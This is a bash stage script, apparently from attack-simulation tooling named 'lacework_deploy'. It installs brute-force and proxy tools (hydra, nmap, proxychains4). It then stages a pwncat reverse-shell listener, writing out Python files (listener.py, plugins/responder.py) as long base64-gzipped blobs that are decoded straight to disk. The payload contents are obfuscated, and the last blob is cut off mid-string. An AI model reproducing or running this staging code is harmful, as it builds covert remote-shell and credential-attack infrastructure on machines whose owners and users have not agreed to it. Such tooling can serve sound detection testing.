#!/usr/bin/env bash

# TEMPLATE INPUTS
# script_name: name of the script, which will be used for the log file (e.g. /tmp/<script_name>.log)
# log_rotation_count: total number of log files to keep
# apt_pre_tasks: shell commands to execute before install
# apt_packages: a list of apt packages to install
# apt_post_tasks: shell commands to execute after install
# yum_pre_tasks:  shell commands to execute before install
# yum_packages: a list of yum packages to install
# yum_post_tasks: shell commands to execute after install
# script_delay_secs: total number of seconds to wait before starting the next stage
# next_stage_payload: shell commands to execute after delay

export SCRIPTNAME="tag"
export LOCKFILE="/tmp/lacework_deploy_$SCRIPTNAME.lock"
export LOCKLOG=/tmp/lock_$SCRIPTNAME.log
export MAXLOG=2
truncate -s0 $LOCKLOG
# Initial lock is debug for lock handler
export LOGFILE=$LOCKLOG
function log {
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
    echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
}

# in some cases we'll have multiple executions as the same time - try to randomize start time
RAND_WAIT=$(($RANDOM%(300-30+1)+30))
log "waiting $RAND_WAIT seconds before starting..."
sleep $RAND_WAIT

if command -v yum && ! command -v ps; then
    RETRY="--setopt=retries=10"
    yum update $RETRY -y && yum $RETRY install -y procps
fi

CURRENT_PROCESS=$(echo $)
PROCESSES=$(pgrep -f "\| tee /tmp/payload_$SCRIPTNAME \| base64 -d \| gunzip")
PROCESS_NAMES=$(echo -n $PROCESSES | xargs --no-run-if-empty ps fp)
COUNT=$(pgrep -f "\| tee /tmp/payload_$SCRIPTNAME \| base64 -d \| gunzip" | wc -l)
# logs initially appended to current log - no log rotate before checking lock file
log "Lock pids: $PROCESSES"
log "Lock process names: $PROCESS_NAMES"
log "Lock process count: $COUNT"
if [ -e "$LOCKFILE" ] && [ $COUNT -gt 1 ]; then
    log "LOCKCHECK: Another instance of the script is already running. Exiting..."
    exit 1
elif [ -e "$LOCKFILE" ] && [ $COUNT -eq 1 ]; then
    log "LOCKCHECK: Lock file with no running process found - updating lock file time and starting process"
    touch "$LOCKFILE"
else
    log "LOCKCHECK: No lock file and no running process found - creating lock file"
    mkdir -p "$(dirname "$LOCKFILE")" && touch "$LOCKFILE"
fi
function cleanup {
    rm -f "$LOCKFILE"
}
trap cleanup EXIT INT TERM
trap cleanup SIGINT

# Update lofile after lock check
export LOGFILE=/tmp/lacework_deploy_$SCRIPTNAME.log

# Log rotate
for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true

# Determine Package Manager
if command -v apt-get &>/dev/null; then
    export PACKAGE_MANAGER="apt-get"
    PACKAGES="proxychains4 nmap hydra python3-pip"
    RETRY="-o Acquire::Retries=10"
elif command -v yum &>/dev/null; then
    export PACKAGE_MANAGER="yum"
    PACKAGES="nmap python3-pip"
    RETRY="--setopt=retries=10"
else
    log "Neither apt-get nor yum found. Exiting..."
    exit 1
fi

# Wait for Package Manager
check_package_manager() {
    if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
        # Return 0 (false) if a package manager process is found, indicating it's busy
        ! pgrep -f "apt-get (install|update|remove|upgrade)" && \
        ! pgrep -f "aptitude (install|update|remove|upgrade)" && \
        ! pgrep -f "dpkg (install|configure)"
    else
        # Similar logic for yum/rpm
        ! pgrep -f "yum (install|update|remove|upgrade)" && \
        ! pgrep -f "rpm (install|update|remove|upgrade)"
    fi
}

check_payload_update() {
    local payload_path=$1  # First argument passed to the function
    local start_hash=$2
    local check_hash=$(sha256sum --text "$payload_path" | awk '{ print $1 }')
    log "comparing start payload hash: $start_hash to current payload hash: $check_hash"
    if [ "$check_hash" != "$start_hash" ]; then
        log "payload update detected..."
        return 1  # Return 1 if payload update is detected
    else
        log "no payload update..."
        return 0  # Return 0 if no update is detected
    fi
}

# if package manager is busy wait some random amount of time - again to create more randomness
while ! check_package_manager; do
    RAND_WAIT=$(($RANDOM%(300-30+1)+30))
    log "Waiting for $PACKAGE_MANAGER to be available - sleeping $RAND_WAIT"
    sleep $RAND_WAIT
done

# export functions for child script usage
export -f log check_payload_update

# Conditional Commands based on package manager
if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
log "Starting apt pre-task";

log "Done apt pre-task";
elif [ "$PACKAGE_MANAGER" == "yum" ]; then
log "Starting yum pre-task";
if ! command -v proxychains4 > /dev/null || ! command -v hydra > /dev/null || ! command -v hydra > /dev/null; then
    yum update -y
    yum install -y git
    yum groupinstall -y 'Development Tools'
    # proxychains4
    cd /usr/local/src
    git clone https://github.com/rofl0r/proxychains-ng
    cd proxychains-ng
    ./configure && make && make install
    make install-config
    # hydra
    cd /usr/local/src
    git clone https://github.com/vanhauser-thc/thc-hydra
    cd thc-hydra
    ./configure && make && make install
fi

log "Done yum pre-task";
fi
if [ "" != "$PACKAGES" ]; then
    while true; do
        /bin/bash -c "$PACKAGE_MANAGER update && $PACKAGE_MANAGER install -y $PACKAGES" >> $LOGFILE 2>&1
        if [ $? -ne 0 ]; then
            log "Failed to install some_package using $PACKAGE_MANAGER - retry required"
            while ! check_package_manager; do
                RAND_WAIT=$(($RANDOM%(300-30+1)+30))
                log "Waiting for $PACKAGE_MANAGER to be available - sleeping $RAND_WAIT"
                sleep $RAND_WAIT
            done
        else
            break
        fi
    done
fi
if [ "$PACKAGE_MANAGER" == "apt-get" ]; then
log "Starting apt post-task";

log "Done apt post-task";
elif [ "$PACKAGE_MANAGER" == "yum" ]; then
log "Starting yum post-task";

log "Done yum post-task";
fi

MAX_WAIT=30
CHECK_INTERVAL=60
log "starting delay: $MAX_WAIT seconds"
SECONDS_WAITED=0
while true; do 
    SECONDS_WAITED=$((SECONDS_WAITED + CHECK_INTERVAL))
    if [ $SECONDS_WAITED -ge $MAX_WAIT ]; then
        log "completed wait $((MAX_WAIT / 60)) minutes." && break
    fi
    sleep $CHECK_INTERVAL;
done
log "delay complete"

log "starting next stage after $SECONDS_WAITED seconds..."
log "starting execution of next stage payload..."
PWNCAT_LOG="/tmp/pwncat.log"
PWNCAT_SESSION="pwncat"
PWNCAT_SESSION_LOCK="/tmp/pwncat_session.lock"
if [ -e "$PWNCAT_SESSION_LOCK" ]  && screen -ls | grep -q "$PWNCAT_SESSION"; then
    log "Pwncat session lock $PWNCAT_SESSION_LOCK exists and pwncat screen session running. Skipping setup."
else
    rm -f "$PWNCAT_SESSION_LOCK"
    log "Session lock doesn't exist and screen session not runing. Continuing..."
    log "setting up reverse shell listener: listen_ip:listen_port"
    screen -S $PWNCAT_SESSION -X quit
    screen -wipe
    log "cleaning app directory"
    rm -rf /pwncat
    mkdir -p /pwncat/plugins /pwncat/resources
    cd /pwncat
    echo H4sIAAAAAAAA/5RWzY7cNhK+6ylq5YPUgFoysHMaQAcfZhdGEsPIOKcgENhSSWJMkQSr1D0d2+8ekKL6d+wgM0BTKn2s//rIN/+pZnLVTuoK9R7skUej/5vIyRrHYCjpnZnAHnQruJxZKoifWqPJKFyRETEJLQZ0q5TkoIU6vR3p9DjvrDMt0mpA8KjkblX+UfC4QoUbrHCESRIWB/VJVL5zwzyh5o/hS94htU5alkbXmcM9OkKgEZUCJYlRo8s2UU0puq4RcX+ebbfeWFYk8Mpfh8QnhU1Q2Cxw4KPFWmouoMNezIrrh4eHhwJGVLbOFqsQsN81PBr6N4YX+GKY2J0NfzAaV8MepMWElbTQGwc8IvAoCa6z4mEl/EbYARtwiMRipySNvrwaW59JMA4IW6M7IBYDlj9IoTgqI7qsiI5Hz5qz/N7rrJ2dgu3PMDJbeqyqQfI478rWTJVFQbTVQ/Xx6d3zs39wqFAQUqUEI3HVmYP2qisltUeXNMJXCO28EzTClmC7Db8fYGt8BzJOjdS9cZPw0RWt0SykRle0ysxd4duSmtYZTQ3LCR015PYtNWTaz8hUzORllyrI9HwQDq+EUjM6JJZ6aHqpkK4kFt1Eixy+AiNCxZM9RcEvvsRLKWOiICYRJMGnd88/gTYMZLGVvcSu6s2sO1+aRLiBoIZYorD4IlG+SZKkwx4G5IZQ9Y20+eYx9J1D8ibqi7ks3azzU1P+np1ymhWQbdusgD6WjkLpHqtK2v1DKVuhR/GXtL6C2R8FtIeuznx0WQGtsDw7bMzMdub6k5uxAMaX5XETfeHZ6ehSSdyZmaPnC500o9CdQpeTHAronZgwhmGd9I343ifazZahFfMwcln6xHgAIZE0ulGm/Qx1oJk8DZlf+KuJgNID0mWP7K+2lfgiiWnN3K3WctZK6s95tHckj+f87Zp8jYfVSB7XxxvyLJ8XebTwBn4NGZF6gF4oQh8VIYWZjir89O4QHE5mjx3IacJOCkZ1vAy7VGbIU42HVXCO0DdIec8zvtk8rZxjfQVTX3dUgKKif9r0HZN3DvepFz/Cl3vst8cvr2jxbPsthsbueFen0NmT6WaFdeqQrNEdurR4xc36XvQ6Ud97UH/HsxPzray4AG+EMYsvLVqGp7D4MgsCvI8nZCl7cs44wBdsZ08xEPhvOQ8f4Qt+iyMQvBWSEDC5nLf/+dZKkuQNiK4DeRqhOGzhFGkVCj1bMD2ECfL8lSxDWS5LHt+e3////YdPxc3EbpLkIHm87fdfljXf+PiicO39p9OJJOK2NewAWFX4nDVLTSkndrkf7fJPI7W/WZx5LIjbQ5dvijj9Vs2D1JRuNpvNlcrW6F4OJSHn6R7dzhCmBSyUNSizi5QV9oSo4o2oJBY8U562DkWoxHr3KMsyvaCNVQz12abfgs36Jb/qNesMm9aoOl2OovS6FUO/pm/L8H/z7YcNeY1Ugv0hVqdK6vnlRs/pfoBdfcFkJ0xMx7kqQ56ewlyC69I1Z6NUeM6NpEYoucdLYrWCKPkbAAD//wEAAP//ie0A4aIKAAA= | base64 -d | gunzip > listener.py
echo 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 | base64 -d | gunzip > plugins/responder.py
echo H4sIAAAAAAAA/8xZbXMatxb+vr/iVMHBTCqo7dtmhnY9gw1OuLbBAzhpbpwhYleAzK60lrS2uXXvb78j7Ss2JDhtZpoPBnaPjp5znvMm5cUPjQnjjQlRc8cZHg+6F6Ne67zjMq404R7dl75yzvpvTrpnHbehw6hRKaTqgZg505h7mgkOgZjBHw4AAPXmAj77RFPAMbxCOx/wToh3/NHO2+bOeXNn+B/0GUFlDz1PGg4PoZJicf50zlu/n/XfuPvOVEhgwDh8VvQGKru7yRu8V6sB3oO9z7+CLyC8BZStrqM/KuzHyu4ue7VXq/0J+4cNn942eBwE8PAAWsbUrOHUCW/zLUvL99C6JY5jXICO59RbMD4Dg4vcKfACVq/XkXM3ZwGFH+Buzry5fXMIuRKzn3WH1ZEuAy40TEXMfRDS/pCU+EvAcEeYZnyWeFAFlEawt/+TYzHnGiKi502o7OYb1pDjDDpvuv2eK+mMCe50eu+6g37vvNMbuZrIGdVOu3Nx1v9gn/g0CsQypFw7F4O+jQGURQZyRKSVizDmAnsBwxGZUYlSJ7TFHQ8E8Y0frm+s+V4sA8Bn/wYsoBEraQPv+gbmWkeq2WjMmJ7Hk7onwsb1TUD4rHF905A0oERR1fBThY3rG7xXf20+Asbje0xC/5d/wcuX4M1D4cPrn38ua3ecF+v/OS8SbiT1QVEdRxsFE4OieBIwD1hkHJqYonLozCN8Tv7LIoO+lvmA3BIWkElAIZJiygKqzFq7q+BTNoslhYApjbPXZmUWJF8QgweYSRpBJeVkNXRCppTxeirdzMXQanj5TFq1jM8MrEABDrQk8L9GPYmUXDqNNRvPqVZLaBF6v6SRl9g9iDm3Ws02SiuYUY09EgRUYuZTrpleAs7McQt8z5OHignAclGA/cOXeymIN1Rb0F4sJeUaiOeJmGvgcTih0uJvvR+OW8fH/cveaNy7PD/qDNyEnmdjeIDrG8ASqvVWsk21lqBIf0LP7tqEytM90ZdC1AtE7APlcUglMVV2o6zyRKytx9egxFjSSEiNDekNKYRuWPn0Mdgcnkhxp6j8EhzpK6D3UxaA4iRSc6GBcB/ovdGyOYFeGG/axT7VhAUKplKEoFQIEZEkpJpKUFpIusqdPzEpwKmnQYsF5Za19tHb/nDkopQqFVqqCj0YcxJSF/mT8VwojQDjO6bn2KeeXEa2U23wkCmIbiWpjwmxBa8Xmf76OxLEtAoP4MUasA+oiQBPYa9moF0OO4OtoMWKSvPjL8GDzfhqyHkB7aOL1nC4FZ6IKHUnpP8d8bSPLvqD7Ygz4fRdkaRNcBssifrviMYjGn77DXf6JysDThrnleQzi61K8pk5s5J8FhZVsm9Op3+SZZ6/5CQ0zYuEMCGK+kBiPU9yaouMG/VPO7mvTBbPKDfliGJ/go0mbGXX+8PkoPElpIYYKVNyUuS5xyDzGMZZbkBqbOLEGkqgWjRNqNhP9KjatyfddDzp2qI9ZWmtbx+Nu73hqNU77oy7bbewxafKk2xibclGGwVXDqwzJ3n8iGL7NOHZfMu4RvX2UQZGffwED6BoQD29Wx+R2RlT2j7brZ/SJbguXCHKb5kU3ExbV8jW1SRGkreV0qR2hWq1r